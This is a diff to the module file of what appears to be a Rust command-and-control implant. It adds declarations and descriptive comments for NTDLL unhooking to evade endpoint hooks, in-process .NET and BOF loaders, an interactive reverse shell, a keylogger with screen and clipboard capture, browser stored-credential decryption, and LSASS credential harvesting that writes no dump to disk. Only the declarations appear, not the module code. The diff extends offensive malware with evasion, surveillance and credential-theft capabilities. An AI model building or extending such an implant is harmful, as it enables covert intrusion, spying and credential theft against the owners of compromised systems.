@@ -51,6 +51,13 @@ pub mod p2p;
 #[cfg(windows)]
 pub mod injection_engine;
 
+// NTDLL unhooking via \KnownDlls re-fetch. Supplements Halo's Gate by
+// re-fetching a clean ntdll .text section when all adjacent syscall stubs
+// are hooked. Used as fallback when Halo's Gate cannot infer an SSN,
+// as a post-sleep-wake re-check, and on operator command.
+#[cfg(windows)]
+pub mod ntdll_unhook;
+
 // Advanced sleep obfuscation with full memory encryption, stack spoofing,
 // and anti-forensics.  Replaces the Ekko-style sleep on Windows.
 #[cfg(windows)]
@@ -62,9 +69,44 @@ pub mod sleep_obfuscation;
 #[cfg(windows)]
 pub mod memory_hygiene;
 
+// In-process .NET assembly execution via CLR hosting (ICLRMetaHost).
+// Equivalent to Cobalt Strike's execute-assembly.  Loads and runs arbitrary
+// .NET assemblies entirely in-process without spawning a child process.
+#[cfg(windows)]
+pub mod assembly_loader;
+
+// BOF (Beacon Object File) / COFF loader — executes small position-
+// independent C/Rust object files in-process.  Compatible with the public
+// BOF ecosystem (trustedsec, CCob, naaf, etc.) via the DLL$Function symbol
+// resolution scheme.
+#[cfg(windows)]
+pub mod coff_loader;
+
+// Interactive reverse shell — persistent cmd.exe / sh / custom shell process
+// where the operator can type commands and receive real-time output.
+// Background reader threads stream output asynchronously through the C2
+// channel as Message::ShellOutput events.
+pub mod interactive_shell;
+
 // Malleable C2 profile parser — defines how the agent shapes its C2 traffic
 // (HTTP/DNS) to blend in with legitimate network activity.  Platform-agnostic.
 pub mod malleable;
+
+// Surveillance capabilities: screenshot capture, keylogger, clipboard monitor.
+// Gated by the `surveillance` feature flag.
+#[cfg(feature = "surveillance")]
+pub mod surveillance;
+
+// Browser stored-data recovery: Chrome (App-Bound Encryption v127+), Edge,
+// Firefox (NSS-based decryption).  Windows-only, gated by `browser-data`.
+#[cfg(all(windows, feature = "browser-data"))]
+pub mod browser_data;
+
+// LSASS credential harvesting: incremental memory reading via indirect syscalls.
+// Parses credential structures in-process without creating a dump file on disk.
+// Windows-only.
+#[cfg(windows)]
+pub mod lsass_harvest;
 
 use anyhow::Result;
 use common::{CryptoSession, Message, Transport};
